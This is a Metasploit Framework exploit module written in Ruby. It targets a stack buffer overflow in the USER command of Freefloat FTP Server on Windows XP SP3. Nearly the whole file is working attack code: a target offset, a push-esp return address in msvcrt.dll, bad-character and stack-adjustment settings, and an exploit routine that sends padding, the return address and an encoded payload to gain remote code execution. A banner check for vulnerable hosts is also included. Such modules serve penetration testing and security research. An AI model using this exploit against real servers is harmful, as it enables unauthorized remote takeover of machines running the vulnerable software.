##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#  http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'       => 'Free Float FTP Server USER Command Buffer Overflow',
      'Description'   => %q{
          Freefloat FTP Server is prone to an overflow condition. It
        fails to properly sanitize user-supplied input resulting in a
        stack-based buffer overflow. With a specially crafted 'USER'
        command, a remote attacker can potentially have an unspecified
        impact.
      },
      'Platform'     => 'win',
      'Author'     =>
        [
          'D35m0nd142', # Original exploit
          'Doug Prostko <dougtko[at]gmail.com>' # MSF module
        ],
      'License'     => MSF_LICENSE,
      'References'   =>
        [
          [ 'OSVDB', '69621'],
          [ 'EDB', '23243']
        ],
      'Privileged'   => false,
      'Payload'     =>
        {
          'Space'          => 444,
          'DisableNops'    => true,
          'BadChars'       => "\x00\x0a\x0d",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'Targets'    =>
        [
          [ 'FreeFloat / Windows XP SP3',
            {
              'Ret' => 0x77c35459 , # push esp; ret - mscvrt.dll
              'Offset'   => 230
            }
          ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jun 12 2012'))
  end

  def check
    connect
    disconnect
    if (banner =~ /FreeFloat/)
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    connect
    buf = rand_text(target['Offset'])
    buf << [ target['Ret'] ].pack('V')
    buf << rand_text(8)
    buf << payload.encoded
    send_user(buf)
    disconnect
  end
end
